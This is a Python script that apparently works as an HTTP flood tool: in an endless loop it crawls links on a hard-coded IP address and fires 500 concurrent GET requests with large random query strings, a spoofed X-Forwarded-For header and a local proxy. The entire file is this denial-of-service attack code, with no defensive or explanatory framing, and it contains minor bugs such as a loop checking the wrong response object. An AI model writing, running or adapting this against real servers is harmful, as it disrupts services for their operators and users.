import ipaddress
import asyncio
from loguru import logger
import os

from urllib.parse import urlparse
from yarl import URL
from aiohttp import ClientSession, TCPConnector

from typing import Any
from bs4 import BeautifulSoup

headers = {
    "Connection": 'close',
    "X-Forwarded-For": '8.8.8.8'
}


async def fire_once(url: str | URL, data: Any = os.urandom(114514), proxy: str=None):
    async with ClientSession(url, proxy=proxy if proxy else {}, headers=headers) as session:
        try:
            async with session.get(f'/?{str(data)}') as req:
                _ = await req.read()
                logger.info("Connected to {}:{}", req.status, req.url)
                req.close()
        except:
            pass


async def fire_twice_mfss(session: ClientSession, url: str | URL, data: Any = os.urandom(114514), proxy: str=None):
    try:
        async with session.get(f'/{url.removeprefix("/")}?{str(data)}', proxy=proxy) as req1:
            logger.debug("Connected to {}:{}", req1.status, req1.url)
            while not (req1.closed or req1.content.is_eof()):
                b_data = await req1.content.read(114514)
                if not b_data:
                    break
                await asyncio.sleep(0)
            logger.info("Read complete to {}:{}", req1.status, req1.url)
        async with session.get(f'/?{str(data)}') as req2:
            logger.debug("Connected to {}:{}", req2.status, req2.url)
            while not (req2.closed or req1.content.is_eof()):
                b_data = await req2.content.read(114514)
                if not b_data:
                    break
                await asyncio.sleep(0)
            logger.info("Read complete to {}:{}", req2.status, req2.url)

    except Exception as e:
        pass


async def main():
    while True:
        async with ClientSession("http://183.141.128.63:8000/", headers=headers) as session:
            prefixes = set()
            async with session.get("/") as req:
                if 200 <= req.status < 300:
                    text = await req.text()
                    soup = BeautifulSoup(text, 'html.parser')
                    links = soup.find_all("a")
                    for link in links:
                        prefixes |= {link['href'] or '/'}
                else:
                    prefixes = ['/'] * 300

            prefixes = list(prefixes)

            data1 = os.urandom(1145)
            tasks = []
            for i in range(500):
                tasks.append(
                    fire_twice_mfss(
                        session,
                        prefixes[i % len(prefixes)],
                        data1,
                        "http://localhost:20171"
                    )
                )

            await asyncio.gather(*tasks)


loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)
asyncio.run(main())
